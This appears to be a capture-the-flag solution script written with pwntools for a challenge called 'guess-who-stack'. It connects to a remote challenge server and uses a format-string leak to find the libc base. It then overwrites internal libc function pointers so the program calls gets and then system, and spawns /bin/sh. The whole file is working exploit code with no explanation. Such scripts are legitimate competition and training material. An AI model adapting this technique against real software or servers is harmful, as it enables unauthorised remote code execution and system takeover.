from pwn import *

elf = context.binary = ELF("chal")
libc = ELF('libc.so.6')

context.terminal = ['tmux', 'split-window', '-h']
#p = elf.process()
p = remote("guess-who-stack.harkonnen.b01lersc.tf", 8443, ssl=True)

leak_p = flat([
    b'%13$p'
])

p.sendline(leak_p)
p.recvuntil(b'are heavy ')

leak = int(p.recvuntil(b'\n').strip(b'\n'), 16)

# leaked __libc_start_main return address on stack
libc.address = leak - libc.symbols['__libc_start_main'] + 128 - 0x50

print(hex(libc.address))

# __memmove_evex_unaligned_erms, called in printf
p.sendlineafter(b'come out... ',
                f"{libc.address + 0x1fe150} {libc.symbols['gets']+4}")

# __memchr_evex, called in gets
p.sendafter(b'jokin now... ',
            f"{libc.address + 0x1fe040} {libc.symbols['system']}")


# the get input get puts to rdi
p.sendline(b" /bin/sh;")

p.interactive()
